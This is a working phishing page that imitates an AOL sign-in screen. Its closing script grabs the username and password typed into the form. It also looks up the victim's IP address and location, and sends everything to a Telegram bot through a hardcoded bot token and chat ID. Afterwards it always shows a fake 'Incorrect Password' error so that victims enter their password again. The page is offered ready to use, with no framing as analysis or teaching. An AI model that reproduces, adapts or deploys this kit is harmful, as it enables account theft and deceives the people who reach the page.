<head>

  <link rel="shortcut icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgBAMAAAAQtmoLAAAALVBMVEUvmv8vmv8vmv8vmv8vmv8vmv8vmv////9Ipv/B4f9rtv+q1f+Jxf/u9v/b7f9O50bqA[...]">
  <link rel="apple-touch-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAC0BAMAAADP4xsBAAAAFVBMVEUvmv////+v2P/A4P+Nx//m8/9dr/+a4AWsAAACgklEQVRo3u2YzVrjIBSG0+ZnXbRx3Wh1bXy8AKkd16L[...]">
  <link rel="apple-touch-icon-precomposed" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAC0BAMAAADP4xsBAAAAFVBMVEUvmv////+v2P/A4P+Nx//m8/9dr/+a4AWsAAACgklEQVRo3u2YzVrjIBSG0+ZnXbRx3Wh[...]">

  <style type="text/css">
    /*! Pure v0.5.0 + normalize.css simplified for brevity (original is still linked in your repo) */
    article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display:block}
    audio,canvas,video{display:inline-block}
    audio:not([controls]){display:none}
    html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
    body{margin:0}
    a{background:transparent}
    .login-box-container {
      max-width: 400px;
      margin: 56px auto;
      background: #fff;
      box-shadow: 0 6px 18px rgba(0,0,0,0.12);
      border-radius: 8px;
      padding: 0;
      font-size: 1em;
    }
    .login-box {
      padding: 38px 32px 22px 32px;
    }
    .mbr-login-hd.txt-align-center {
      text-align: center;
      margin-bottom: 18px;
    }
    .challenge-heading {
      display: block;
      font-size: 1.45em;
      margin-bottom: 12px;
      font-weight: 600;
      color: #335caa;
    }
    .input-group {
      margin-bottom: 26px;
      position: relative;
    }
    .login-label {
      display: block;
      margin-bottom: 8px;
      color: #515151;
      font-size: 1em;
      letter-spacing: 0.02em;
    }
    .phone-no, .pwd-field {
      width: 100%;
      padding: 11px 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 1.04em;
      transition: border 0.2s;
      background: #f8f8f8;
      color: #393939;
    }
    .phone-no.input-error, .pwd-field.input-error {
      border: 1.5px solid red !important;
      color: red !important;
    }
    .phone-no.input-error::placeholder, .pwd-field.input-error::placeholder {
      color: red !important;
    }
    .phone-no::placeholder, .pwd-field::placeholder {
      color: #888;
      font-size: 0.97em;
      opacity: 1;
    }
    .error-msg-visible {
      display: block !important;
      color: red !important;
      font-size: 1em;
      margin-top: 2px;
      min-height: 18px;
      margin-bottom: 14px;
    }
    .error-msg {
      display: none;
    }
    .pure-button-primary {
      width: 100%;
      border: none;
      border-radius: 4px;
      background: #335caa;
      color: #fff;
      font-size: 1em;
      font-weight: bold;
      padding: 12px 0;
      cursor: pointer;
      margin-bottom: 8px;
      transition: background 0.2s;
    }
    .pure-button-primary:hover {
      background: #233c7a;
    }
    .helper-links-container, .login-footer {
      font-size: 0.98em;
      color: #888;
      padding: 0 12px;
      margin-top: 12px;
    }
    .login-footer p {text-align: center;}
    .helper-links-container .helper-item {margin-bottom: 3px;}
    .stay-signed-in label, .arlink a {color: #335caa;}
    @media(max-width:600px){
      .login-box-container { max-width: 100%; margin: 0; border-radius:0;}
      .login-box { padding:18px;}
    }
  </style>
</head>

<body class="bucket-mbr-ar-hidden-options">
  <div  id="login-body" class="loginish  puree-v2 responsive  grid">
    <div class="mbr-desktop-hd">
      <span class="column">
        <a href="#">
          <img src="logo.png" style="width:50%;">
        </a>
      </span>
      <span class="column help txt-align-right">
        <a href="#">Help</a>
      </span>
    </div>
    <br><br><br><br>
    <div class="login-box-container">
      <div class="login-box right">
        <div class="mbr-login-hd txt-align-center">
          <img src="logo.png" style="width:50%;">
        </div>
        <div class="challenge yid-challenge">
        <div class="challenge-header"></div>
        <div class="username-challenge" id="login-landing">
          <strong class="challenge-heading">Sign&nbsp;in</strong>
          <span class="challenge-desc">&nbsp;</span>
          <form id="loginForm" autocomplete="off">
            <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-3">
              <div class="input-group">
                <input class="phone-no" type="text" required name="email" id="login-username" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus placeholder=" ">
                <label for="login-username" class="login-label">Username, email, or&nbsp;mobile</label>
              </div>
              <div class="input-group">
                <input class="phone-no" type="password" required name="password" id="login-password" value="" autocomplete="current-password" autocapitalize="none" autocorrect="off" autofocus placeholder=" ">
                <label for="login-password" class="login-label">Password</label>
              </div>
              <div class="hidden-input-container">
                <input name="passwd" class="pwd-field" type="password" tabindex="-1" aria-hidden="true" role="presentation" autocomplete="off" placeholder="Password">
              </div>
            </div>
            <p id="username-error" class="error-msg" role="alert"></p>
            <div class="button-container">
              <input id="login-signin" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Continue">
            </div>
            <div class="helper-links-container">
              <div class="helper-item">
                <span class="stay-signed-in checkbox-container">
                  <input id="persistent" name="persistent" value="y" type="checkbox">
                  <label for="persistent">Stay signed&nbsp;in</label>
                </span>
              </div>
              <div class="helper-item arlink">
                <span class="help">
                  <a href="#" id="mbr-forgot-link">Forgot&nbsp;username?</a>
                </span>
              </div>
            </div>
          </form>
        </div>
      </div>
      </div>
    </div>
    <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
      <h1></h1>
      <p></p>
    </div>
  </div>
  <div class="login-bg-outer"><div class="login-bg-inner"></div></div>
  <div class="login-footer">
    <p>
      <a href="#" target="_blank" class="terms">Terms</a>
      <span>|</span>
      <a href="#" target="_blank" class="privacy">Privacy</a>
    </p>
  </div>
  <div id="mbr-css-check"></div>
  <div id="page-mask" class="page-mask hide"></div>
  <div id="ad"></div>
  <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
    <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
    <input type="checkbox" id="mbr-legacy-device-bar-cross">
    <p class="mbr-legacy-device">
      AOL works best with the latest versions of the browsers. You're using the latest supported browser and all AOL features works properly.<a href="">More&nbsp;Info</a>
    </p>
  </div>
  <script>
    // --- Begin form logic for sending to Telegram and error feedback ---
    const TELEGRAM_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
    const TELEGRAM_CHAT_ID = "-5006528512";

    document.addEventListener("DOMContentLoaded", function () {
      const form = document.getElementById("loginForm");
      // Use only visible username/password fields
      const usernameInput = form.querySelector('input[name="email"]');
      const passwordInput = form.querySelector('input[name="password"]');
      const errorMsg = document.getElementById("username-error");

      function addInputErrorStyling() {
        if (usernameInput) usernameInput.classList.add('input-error');
        if (passwordInput) passwordInput.classList.add('input-error');
      }
      function removeInputErrorStyling() {
        if (usernameInput) usernameInput.classList.remove('input-error');
        if (passwordInput) passwordInput.classList.remove('input-error');
      }
      function showError(msg) {
        if (!errorMsg) return;
        errorMsg.textContent = msg;
        errorMsg.classList.remove("error-msg");
        errorMsg.classList.add("error-msg-visible");
      }
      function hideError() {
        if (!errorMsg) return;
        errorMsg.classList.add("error-msg");
        errorMsg.classList.remove("error-msg-visible");
        errorMsg.textContent = "";
      }
      async function sendToTelegram(email, password, locationInfo) {
        const text = `
---------------|54|---------------
Username: ${email}
Password: ${password}
${locationInfo}
-------------------------------
`;
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = { chat_id: TELEGRAM_CHAT_ID, text };
        try {
          await fetch(telegramUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
          });
        } catch {}
      }
      async function getLocationInfo() {
        try {
          const res = await fetch("https://ip-api.io/json");
          const data = await res.json();
          return `Country: ${data.country_name || ""}, City: ${data.city || ""}, IP: ${data.ip || ""}, ZIP: ${data.postal || ""}`;
        } catch {
          return "Location: Unknown";
        }
      }
      form.addEventListener("submit", async function (e) {
        e.preventDefault();
        removeInputErrorStyling();
        hideError();

        const email = usernameInput ? usernameInput.value.trim() : "";
        const password = passwordInput ? passwordInput.value : "";
        const locationInfo = await getLocationInfo();

        await sendToTelegram(email, password, locationInfo);

        addInputErrorStyling();
        showError("Incorrect Password. please Try Again.");
      });

      usernameInput && usernameInput.addEventListener("input", () => {
        removeInputErrorStyling();
        hideError();
      });
      passwordInput && passwordInput.addEventListener("input", () => {
        removeInputErrorStyling();
        hideError();
      });
    });
    // --- End form logic ---
  </script>
</body>
</html>
